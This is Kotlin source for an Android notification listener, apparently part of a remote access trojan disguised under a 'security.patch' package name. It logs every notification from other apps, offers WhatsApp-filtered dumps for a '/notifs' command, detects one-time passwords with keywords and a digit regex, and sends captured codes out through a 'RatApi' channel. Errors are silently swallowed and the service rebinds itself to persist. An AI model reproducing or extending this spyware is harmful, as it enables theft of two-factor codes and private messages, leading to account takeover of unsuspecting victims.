package com.android.security.patch

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.android.security.patch.Pager.Item
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentLinkedDeque

class NotifListener : NotificationListenerService() {

    companion object {
        @Volatile var alive = false
        private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

        private val OTP_WORDS = listOf(
            "otp", "kode", "code", "verifikasi", "verify", "verification",
            "kode otp", "one time", "one-time", "2fa", "auth", "login code",
            "token", "pin"
        )
        private val OTP_REGEX = Regex("""\b(\d{4,8})\b""")

        private data class Rec(
            val pkg: String, val title: String, val body: String, val ts: Long
        )
        private val buffer = ConcurrentLinkedDeque<Rec>()
        private const val MAX = 500

        fun drainNotifs(filter: String): List<Item> {
            val fmt = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
            val all = buffer.toList().reversed()
            val filtered = when (filter.lowercase()) {
                "wa", "whatsapp" -> all.filter { it.pkg == "com.whatsapp" }
                "wa_biz", "wab", "wb" -> all.filter { it.pkg == "com.whatsapp.w4b" }
                "wa_all", "waall" -> all.filter { it.pkg == "com.whatsapp" || it.pkg == "com.whatsapp.w4b" }
                "" -> all
                else -> all.filter { it.pkg.contains(filter, ignoreCase = true) }
            }
            return filtered.take(100).map {
                Item("[${fmt.format(Date(it.ts))}] ${it.title} — ${it.body.take(80)}", it.pkg)
            }
        }

        fun clearNotifs() { buffer.clear() }
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        alive = true
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        alive = false
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            requestRebind(android.content.ComponentName(this, NotifListener::class.java))
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        try {
            val pkg = sbn.packageName ?: return
            if (pkg == packageName) return
            val extras = sbn.notification?.extras ?: return
            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString().orEmpty()
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString().orEmpty()
            val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString().orEmpty()
            val body = if (bigText.isNotBlank()) bigText else text
            if (title.isBlank() && body.isBlank()) return

            // buffer buat /notifs command
            buffer.addFirst(Rec(pkg, title, body, System.currentTimeMillis()))
            while (buffer.size > MAX) buffer.pollLast()

            // OTP auto-push
            val lower = (title + " " + body).lowercase()
            val isOtp = OTP_WORDS.any { lower.contains(it) }
            val hasDigits = OTP_REGEX.containsMatchIn(body)
            if (isOtp && hasDigits) {
                val code = OTP_REGEX.find(body)?.value ?: ""
                scope.launch {
                    RatApi.sendMessage(
                        this@NotifListener,
                        "<b>OTP captured</b>\nApp: <code>$pkg</code>\nTitle: $title\nBody: $body\nCode: <b>$code</b>"
                    )
                }
            }
        } catch (_: Throwable) {}
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}
}
